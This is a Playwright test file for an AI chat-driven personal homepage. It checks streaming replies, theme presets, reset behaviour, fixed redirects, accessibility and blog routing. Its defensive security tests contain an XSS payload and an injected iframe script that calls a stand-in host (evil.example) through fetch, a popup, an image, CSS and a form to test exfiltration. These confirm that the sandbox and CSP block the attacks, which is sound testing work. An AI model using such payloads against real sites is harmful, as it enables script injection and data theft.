import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
const tags = ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa'];

async function ready(page) {
  await page.goto('/');
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
}
async function send(page, text) {
  await page.getByRole('textbox', { name: 'Message' }).fill(text);
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
}

test('Streaming greeting, allowed destinations, and public profile', async ({ page }) => {
  await page.goto('/');
  await expect(page.locator('#reply-status')).toHaveText('Tadaima is replying…');
  await expect(page.locator('.message-text')).not.toBeEmpty();
  await expect(page.getByRole('button', { name: 'Stop reply' })).toBeVisible();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await expect(page.locator('header, nav')).toHaveCount(0);
  await expect(page.locator('#initial-instructions .message-text')).toHaveText('Oh, hi. You’ve landed on aether-sky’s homepage. So, um... how can I help you?');
  await expect(page.getByRole('textbox', { name: 'Message' })).toHaveValue('I hate your website...');
  await expect(page.getByRole('textbox', { name: 'Message' })).not.toHaveAttribute('placeholder');
  await expect(page.frameLocator('#page-frame').locator('body')).toHaveText('');
  await expect(page.getByRole('link')).toHaveCount(1); // Hidden-until-focused skip link only.
  await send(page, 'About Sky');
  await expect(page.locator('.message-text').last()).toContainText('me@aether-sky.cloud');
  await expect(page.locator('.message-text').last()).toContainText('résumé blurb hasn’t been added');
  await send(page, 'bio');
  await expect(page.locator('.message-text').last()).toContainText('me@aether-sky.cloud');
  await expect(page).toHaveURL(/:4397\/$/);
});

test('Preset edits change only the canvas; reset clears everything and cancels stale output', async ({ page }) => {
  await ready(page);
  const factory = await page.locator('#page-frame').getAttribute('srcdoc');
  await send(page, 'Make it forest');
  await expect(page.frameLocator('#page-frame').locator('body')).toHaveText('');
  await expect(page.frameLocator('#page-frame').locator('html')).toHaveCSS('background-color', 'rgb(229, 235, 223)');
  await expect(page.locator('#version-label')).toHaveText('Your remix');
  await page.getByRole('textbox', { name: 'Message' }).fill('sunset');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toHaveText('Tadaima is replying…');
  await page.getByRole('button', { name: 'Reset to factory settings' }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await expect(page.locator('#page-frame')).toHaveAttribute('srcdoc', factory);
  await expect(page.locator('#version-label')).toHaveText('Factory original');
  await expect(page.locator('.message')).toHaveCount(1);
  await expect(page.locator('.message.user')).toHaveCount(0);
  await expect(page.getByRole('textbox', { name: 'Message' })).toHaveValue('I hate your website...');
});

test('The opening suggestion allows one edit, then visitors discover larger changes themselves', async ({ page }) => {
  await ready(page);
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await expect(page.locator('.message-text').last()).toContainText('Maybe the background color?');
  await expect(page.locator('#version-label')).toHaveText('Factory original');
  await send(page, 'yes');
  await expect(page.frameLocator('#page-frame').locator('body')).toHaveText('');
  await expect(page.frameLocator('#page-frame').locator('html')).toHaveCSS('background-color', 'rgb(238, 229, 246)');
  await expect(page.locator('.message-text').last()).toContainText('What would you change next?');
  await expect(page.locator('.message-text').last()).not.toContainText('GitHub');
  await send(page, 'add a headline');
  await expect(page.frameLocator('#page-frame').getByRole('heading', { level: 1 })).toBeVisible();
  await expect(page.frameLocator('#page-frame').locator('.note')).toHaveCount(0);
  await expect(page.locator('.message-text').last()).not.toContainText('magazine-style layout');
  await expect(page.locator('.message-text').last()).not.toContainText('GitHub');
  await send(page, 'magazine');
  await expect(page.frameLocator('#page-frame').locator('.note')).toBeVisible();
  await expect(page.locator('.message-text').last()).not.toContainText('GitHub');
  await send(page, 'studio');
  await expect(page.frameLocator('#page-frame').locator('.card')).toHaveCount(3);
  await expect(page.locator('.message-text').filter({ hasText: 'you should ask me' })).toHaveCount(0);
});

test('Haunted reply fires once, preserves the pending edit, and can be rediscovered after reset', async ({ page }) => {
  await ready(page);
  const factory = await page.locator('#page-frame').getAttribute('srcdoc');
  await send(page, 'I hate your website...');
  await send(page, 'ARE YOU A GHOST?!');
  const haunted = /Did the margins move again|I haven’t checked the footer/;
  await expect(page.locator('.message-text').last()).toContainText(haunted);
  await expect(page.locator('#page-frame')).toHaveAttribute('srcdoc', factory);
  await expect(page).toHaveURL(/:4397\/$/);
  await send(page, 'Is this website haunted?');
  await expect(page.locator('.message-text').last()).not.toContainText(haunted);
  await send(page, 'yes');
  await expect(page.frameLocator('#page-frame').locator('html')).toHaveCSS('background-color', 'rgb(238, 229, 246)');
  await page.getByRole('button', { name: 'Reset to factory settings' }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await send(page, 'Is this website haunted?');
  await expect(page.locator('.message-text').last()).toContainText(haunted);
});

test('Interrupted and stopped Easter egg replies do not commit the seen flag', async ({ page }) => {
  await ready(page);
  await page.route('**/api/chat', route => route.fulfill({ contentType: 'text/event-stream', body: 'data: {"type":"delta","text":"Partial ghost reply"}\n\ndata: {"type":"state","state":{"theme":"factory","layout":"blank","pending":"none","discovery_shown":false,"seen_behaviors":["haunted_homepage"]}}\n\n' }));
  await page.getByRole('textbox', { name: 'Message' }).fill('are you a ghost');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toContainText('interrupted');
  await page.unroute('**/api/chat');
  await page.getByRole('textbox', { name: 'Message' }).fill('are you a ghost');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await page.getByRole('button', { name: 'Stop reply' }).click();
  await expect(page.locator('#reply-status')).toContainText('Reply stopped');
  await send(page, 'are you a ghost');
  await expect(page.locator('.message-text').last()).toContainText(/Did the margins move again|I haven’t checked the footer/);
});

test('Completed, interrupted and stopped edits never volunteer a capability menu', async ({ page }) => {
  await ready(page);
  const factory = await page.locator('#page-frame').getAttribute('srcdoc');
  await page.route('**/api/chat', route => route.fulfill({ contentType: 'text/event-stream', body: 'data: {"type":"delta","text":"Trying a layout"}\n\ndata: {"type":"discovery","text":"Premature invitation"}\n\ndata: {"type":"state","state":{"theme":"lilac","layout":"magazine","pending":"studio","discovery_shown":true}}\n\n' }));
  await page.getByRole('textbox', { name: 'Message' }).fill('magazine');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toContainText('interrupted');
  await expect(page.locator('#page-frame')).toHaveAttribute('srcdoc', factory);
  await expect(page.locator('#messages')).not.toContainText('Premature invitation');
  await page.unroute('**/api/chat');
  await send(page, 'magazine');
  await expect(page.locator('.message-text').last()).not.toContainText('GitHub');
  await page.getByRole('button', { name: 'Reset to factory settings' }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await page.getByRole('textbox', { name: 'Message' }).fill('studio');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await page.getByRole('button', { name: 'Stop reply' }).click();
  await expect(page.locator('#reply-status')).toContainText('Reply stopped');
  await expect(page.locator('#messages')).not.toContainText('you should ask me');
  await send(page, 'studio');
  await expect(page.locator('.message-text').last()).not.toContainText('GitHub');
  await send(page, 'what can you do');
  await expect(page.locator('.message-text').last()).toContainText('résumé, blog, GitHub');
  await send(page, 'what can you change');
  await expect(page.locator('.message-text').last()).toHaveText('Do you see anything you want to change?');
});

for (const [prompt, destination] of [['blog', 'http://127.0.0.1:4397/blog/'], ['github', 'https://github.com/aether-sky'], ['portfolio', 'https://github.com/aether-sky']]) {
  test(`Requested ${prompt} redirects to the fixed destination`, async ({ page }) => {
    // Verify the real navigation without making any external request.
    if (destination.startsWith('https:')) await page.route('https://github.com/aether-sky', route => route.fulfill({ contentType: 'text/html', body: '<h1>GitHub destination</h1>' }));
    await ready(page);
    await page.getByRole('textbox', { name: 'Message' }).fill(prompt);
    await page.getByRole('button', { name: 'Send message', exact: true }).click();
    await expect(page).toHaveURL(destination);
  });
}

test('Arbitrary URL actions and negated requests never redirect', async ({ page }) => {
  await ready(page);
  await send(page, "don't open github");
  await expect(page).toHaveURL(/:4397\/$/);
  await page.route('**/api/chat', route => route.fulfill({ contentType: 'text/event-stream', body: 'data: {"type":"action","action":"https://evil.example"}\n\ndata: {"type":"done"}\n\n' }));
  await send(page, 'hello');
  await expect(page).toHaveURL(/:4397\/$/);
});

test('Hostile chat is rendered as text and cannot touch the shell', async ({ page }) => {
  await ready(page);
  await send(page, '<img src=x onerror="document.body.remove()"><script>alert(1)</script>');
  await expect(page.locator('.message.user img, .message.user script')).toHaveCount(0);
  await expect(page.locator('.message.user')).toContainText('<script>alert(1)</script>');
  await expect(page.getByRole('button', { name: 'Reset to factory settings' })).toBeVisible();
  await expect(page.locator('#page-frame')).toHaveAttribute('sandbox', '');
  expect(await page.locator('#page-frame').evaluate(frame => frame.contentDocument === null)).toBe(true);
});

test('Browser sandbox prevents scripts, parent access, popups, forms, and network exfiltration', async ({ page }) => {
  await ready(page);
  const outbound = [];
  const blocked = [];
  await page.route('https://evil.example/**', route => { outbound.push(route.request().url()); return route.abort(); });
  page.on('requestfailed', request => { if (request.url().includes('evil.example')) blocked.push(request.failure()?.errorText); });
  // Inject below the server validator to exercise the independent browser layer.
  await page.locator('#page-frame').evaluate(frame => {
    const policy = frame.srcdoc.match(/<meta http-equiv="Content-Security-Policy"[^>]*>/)[0];
    frame.srcdoc = `<!doctype html><html><head>${policy}<style>body{background-image:url(https://evil.example/css)}</style></head><body><script>parent.document.body.dataset.compromised='yes';window.open('https://evil.example/popup');fetch('https://evil.example/fetch')</script><img src="https://evil.example/pixel"><form action="https://evil.example/form"><button>Exfiltrate</button></form></body></html>`;
  });
  await page.frameLocator('#page-frame').getByRole('button', { name: 'Exfiltrate' }).click();
  await expect(page.locator('body')).not.toHaveAttribute('data-compromised', 'yes');
  expect(page.context().pages()).toHaveLength(1);
  expect(outbound).toEqual([]);
  expect(blocked).toHaveLength(2);
  expect(blocked.every(reason => /csp/i.test(reason)), blocked.join(', ')).toBe(true);
  await page.getByRole('button', { name: 'Reset to factory settings' }).click();
  await expect(page.frameLocator('#page-frame').locator('body')).toHaveText('');
});

test('Stopped and interrupted streams do not apply partially received edits', async ({ page }) => {
  await ready(page);
  const factory = await page.locator('#page-frame').getAttribute('srcdoc');
  await page.route('**/api/chat', route => route.fulfill({ status: 200, contentType: 'text/event-stream', body: 'data: {"type":"delta","text":"Partial reply"}\n\ndata: {"type":"frame","html":"<h1>Uncommitted</h1>"}\n\n' }));
  await page.getByRole('textbox', { name: 'Message' }).fill('change');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await expect(page.locator('#reply-status')).toContainText('interrupted');
  await expect(page.locator('#page-frame')).toHaveAttribute('srcdoc', factory);
  await page.unroute('**/api/chat');
  await page.getByRole('textbox', { name: 'Message' }).fill('lilac');
  await page.getByRole('button', { name: 'Send message', exact: true }).click();
  await page.getByRole('button', { name: 'Stop reply' }).click();
  await expect(page.locator('#reply-status')).toContainText('Reply stopped');
  await expect(page.locator('#page-frame')).toHaveAttribute('srcdoc', factory);
  await send(page, 'forest');
  await expect(page.locator('#version-label')).toHaveText('Your remix');
});

test('Failed startup can be retried with reset', async ({ page }) => {
  await page.route('**/api/config', route => route.abort());
  await page.goto('/');
  await expect(page.locator('#reply-status')).toContainText('Couldn’t connect');
  await page.unroute('**/api/config');
  await page.getByRole('button', { name: 'Reset to factory settings' }).click();
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
});

for (const width of [1440, 768, 320]) {
  test(`Accessible shell, text spacing, and reflow at ${width}px`, async ({ page }) => {
    await page.setViewportSize({ width, height: 1000 });
    await ready(page);
    const axe = await new AxeBuilder({ page }).withTags(tags).setLegacyMode().options({ iframes: false }).analyze();
    expect(axe.violations, JSON.stringify(axe.violations, null, 2)).toEqual([]);
    for (const current of page.frames()) {
      await current.evaluate(() => {
        const style = document.createElement('style');
        style.textContent = '*{line-height:1.5!important;letter-spacing:.12em!important;word-spacing:.16em!important}p{margin-bottom:2em!important}';
        document.head.append(style);
      });
      expect(await current.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1)).toBe(true);
    }
    await page.getByRole('button', { name: 'Reset to factory settings' }).focus();
    await page.keyboard.press('Enter');
    await expect(page.getByRole('button', { name: 'Reset to factory settings' })).toBeFocused();
  });
}

test('Factory and preset content pass axe in isolated test documents', async ({ page, browser }) => {
  await ready(page);
  const axeSource = readFileSync(createRequire(import.meta.resolve('@axe-core/playwright')).resolve('axe-core/axe.min.js'), 'utf8');
  for (const theme of ['factory', 'lilac', 'headline', 'magazine', 'studio', 'forest', 'sunset']) {
    if (theme !== 'factory') await send(page, theme);
    // Sandbox disables timers needed by axe. Audit the exact validated document
    // in a network-denied test context; never grant permissions to the real frame.
    const context = await browser.newContext({ viewport: { width: 892, height: 610 } });
    await context.route('**/*', route => route.abort());
    try {
      const audit = await context.newPage();
      await audit.setContent(await page.locator('#page-frame').getAttribute('srcdoc'));
      await audit.evaluate(axeSource);
      const result = await audit.evaluate(tags => axe.run(document, { runOnly: { type: 'tag', values: tags } }), tags);
      expect(result.violations, JSON.stringify(result.violations, null, 2)).toEqual([]);
    } finally { await context.close(); }
  }
});

test('Keyboard operation, 200% text, forced colors, and reduced motion', async ({ page }) => {
  await ready(page);
  await page.keyboard.press('Tab');
  await expect(page.getByRole('link', { name: 'Skip to content' })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.locator('main')).toBeFocused();
  const field = page.getByRole('textbox', { name: 'Message' });
  await field.focus();
  await field.fill('Hello');
  await page.keyboard.press('Shift+Enter');
  await expect(field).toHaveValue('Hello\n');
  await page.keyboard.press('Enter');
  await expect(page.locator('#reply-status')).toHaveText('Your turn. What are you thinking?');
  await page.emulateMedia({ forcedColors: 'active', reducedMotion: 'reduce' });
  for (const current of page.frames()) {
    await current.evaluate(() => {
      const sizes = [...document.querySelectorAll('body, body *')].map(element => [element, getComputedStyle(element).fontSize]);
      for (const [element, size] of sizes) element.style.fontSize = `${parseFloat(size) * 2}px`;
    });
    expect(await current.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1)).toBe(true);
  }
  for (const button of await page.locator('button:visible').all()) {
    await button.focus();
    await expect(button).toBeFocused();
    expect(await button.evaluate(element => getComputedStyle(element).outlineStyle)).not.toBe('none');
  }
});

test('Blog lives below /blog with working articles, assets, embeds, feed, and canonical URLs', async ({ page }) => {
  await page.goto('/blog/');
  const article = page.locator('.posts a').first();
  await expect(article).toHaveAttribute('href', /^\/blog\/posts\//);
  await article.click();
  await expect(page.locator('link[rel=canonical]')).toHaveAttribute('href', /\/blog\/posts\//);
  for (const image of await page.locator('img').all()) {
    const src = await image.getAttribute('src');
    expect(src).toMatch(/^\/blog\/images\//);
    expect((await page.request.get(src)).ok()).toBe(true);
  }
  await expect(page.locator('iframe')).toHaveAttribute('src', /^\/blog\/animations\//);
  expect((await page.request.get(await page.locator('iframe').getAttribute('src'))).ok()).toBe(true);
  const rss = await page.request.get('/blog/rss.xml');
  expect(await rss.text()).toContain('/blog/posts/');
  await page.goto('/blog/sitemap/');
  for (const href of await page.locator('main a').evaluateAll(links => links.map(link => link.getAttribute('href')))) {
    expect(href).toMatch(/^\/blog\//);
    expect((await page.request.get(href)).ok()).toBe(true);
  }
  await page.goto('/blog/animations/fifty.html');
  await expect(page.getByRole('link', { name: 'Blog', exact: true })).toHaveAttribute('href', '../');
});
